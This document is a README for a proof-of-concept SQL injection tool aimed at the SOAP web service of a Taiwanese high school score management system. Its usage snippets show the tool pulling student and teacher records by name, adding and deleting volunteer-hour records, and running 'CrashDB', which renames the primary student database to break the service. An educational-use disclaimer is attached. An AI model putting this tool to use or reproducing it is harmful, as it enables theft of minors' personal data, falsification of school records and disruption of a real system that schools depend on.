# TNSQLI Proof of Concept (PoC)

## Overview
This repository demonstrates a Proof of Concept (PoC) for SQL Injection vulnerabilities in the `tnNewscorews` web service of the Taiwanese high school score management system. The tool interacts with a SOAP-based API to perform malicious SQL queries and retrieve sensitive information.

> **Warning:** This code is intended for educational purposes and authorized security testing only. Unauthorized use of this script on live systems is illegal and unethical.

## Features
- **SQL Injection:** Exploits vulnerable SOAP APIs to execute unauthorized SQL queries.
- **Data Extraction:** Retrieves detailed student information, grades, teacher records, and attendance statistics.
- **Database Manipulation:** Allows insertion, deletion, and modification of records.
- **Database Operations:** Includes database renaming for crash simulations.

## Requirements
- Python 3.7+
- `requests` library
- `xml.etree.ElementTree` for XML parsing

Install dependencies using:
```bash
pip install requests
```

## File Structure
- `tnscorews_sqli.py`: The main Python file containing the `tnscorews_sqli` class for interacting with the SOAP API.

## Usage
### Initialization
Create an instance of the `tnscorews_sqli` class:
```python
from tnsqli import tnscorews_sqli

tnsqli = tnscorews_sqli()
```

### Retrieve Student Information
Retrieve a student's details by name:
```python
student_info = tnsqli.Get_Student_Info_By_Name("John Doe")
print(student_info)
```

Retrieve a student's details by school code and name:
```python
student_info = tnsqli.Get_Student_Info_By_Sch_And_Name("12345", "John Doe")
print(student_info)
```

### Manipulate Database
Rename the primary student database:
```python
tnsqli.CrashDB()
```

Restore the original database name:
```python
tnsqli.FixDB()
```

### Add or Remove Records
Add volunteer service hours for a student:
```python
tnsqli.Add_Volunteer(
    sch_code="12345",
    std_no="67890",
    sch_year="2024",
    sch_term="1",
    hours="10",
    service_contents="Community Service",
    writer_id_no="A123456789",
    writer_name="Teacher A"
)
```

Remove a volunteer record by ID:
```python
tnsqli.Remove_Volunteer_By_Id(123)
```

## Legal Disclaimer
This project is intended for **educational purposes only**. The use of this code against any system without explicit permission is strictly prohibited. The author assumes no liability for misuse.
